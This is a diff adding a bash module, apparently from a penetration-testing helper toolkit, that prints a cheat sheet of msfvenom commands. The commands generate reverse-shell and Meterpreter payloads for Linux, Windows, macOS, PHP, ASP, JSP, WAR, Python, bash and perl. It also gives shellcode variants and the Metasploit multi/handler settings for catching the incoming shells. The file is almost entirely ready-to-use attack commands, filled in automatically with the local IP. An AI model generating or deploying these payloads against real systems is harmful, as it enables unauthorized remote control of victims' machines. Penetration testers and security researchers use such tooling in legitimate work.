@@ -1,0 +1,88 @@
+#!/bin/bash
+
+. "${repository_root}/yaes/modules/common-utils"
+
+function print_payloads {
+
+  decho "loading config file from ${config_path}..."
+  source ${config_path}
+  local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
+
+  decho_green "linux (non-staged)"
+  decho "msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f elf > shell.elf"
+  decho_green "linux (staged)"
+  decho "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f elf > shell.elf"
+  decho_green "linux (standard)"
+  decho "msfvenom -p linux/x86/shell_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f elf > shell.elf"
+  decho ""
+
+  decho_green "windows (non-staged)"
+  decho "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f exe > shell.exe"
+  decho_green "windows (staged)"
+  decho "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f exe > shell.exe"
+  decho_green "windows (standard)"
+  decho "msfvenom -p windows/shell_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f exe > shell.exe"
+  decho ""
+
+  decho_green "mac"
+  decho "msfvenom -p osx/x86/shell_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f macho > shell.macho"
+  decho ""
+
+  decho_green "php"
+  decho "msfvenom -p php/meterpreter_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f raw > shell.php"
+  decho "cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php"
+  decho ""
+
+  decho_green "asp"
+  decho "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f asp > shell.asp"
+  decho ""
+
+  decho_green "jsp"
+  decho "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f raw > shell.jsp"
+  decho ""
+
+  decho_green "war"
+  decho "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f war > shell.war"
+  decho ""
+
+  decho_green "python"
+  decho "msfvenom -p cmd/unix/reverse_python LHOST=${local_ip} LPORT=${reverse_port} -f raw > shell.py"
+  decho ""
+
+  decho_green "bash"
+  decho "msfvenom -p cmd/unix/reverse_bash LHOST=${local_ip} LPORT=${reverse_port} -f raw > shell.sh"
+  decho ""
+
+  decho_green "perl"
+  decho "msfvenom -p cmd/unix/reverse_perl LHOST=${local_ip} LPORT=${reverse_port} -f raw > shell.pl"
+
+  decho_green "shellcode"
+  decho_green "for all shellcode see 'msfvenom -help-formats' for information as to valid parameters, msfvenom will output code that is able to be cut and pasted in this language for your exploits."
+  decho ""
+
+  decho_green "linux shellcode (non-staged)"
+  decho "msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f <language> (c, python, perl, ruby, ...)"
+  decho_green "linux shellcode (staged)"
+  decho "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f <language> (c, python, perl, ruby, ...)"
+  decho_green "linux shellcode (standard)"
+  decho "msfvenom -p linux/x86/shell_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f <language> (c, python, perl, ruby, ...)"
+  decho ""
+
+  decho_green "windows shellcode (non-staged)"
+  decho "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f <language> (c, python, perl, ruby, ...)"
+  decho_green "windows shellcode (staged)"
+  decho "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f <language> (c, python, perl, ruby, ...)"
+  decho_green "windows shellcode (standard)"
+  decho "msfvenom -p windows/shell_reverse_tcp LHOST=${local_ip} LPORT=${reverse_port} -f <language> (c, python, perl, ruby, ...)"
+  decho ""
+
+  decho_green "handlers"
+  decho_green "metasploit handlers can be great at quickly setting up metasploit to be in a position to receive your incoming shells, handlers should be in the following format."
+  decho "use exploit/multi/handler"
+  decho "set PAYLOAD <payload name>"
+  decho "set LHOST ${local_ip}"
+  decho "set LPORT ${reverse_port}"
+  decho "set ExitOnSession false"
+  decho "exploit -j -z"
+  decho_green "once the required values are completed the following command will execute your handler – 'msfconsole -L -r'"
+}
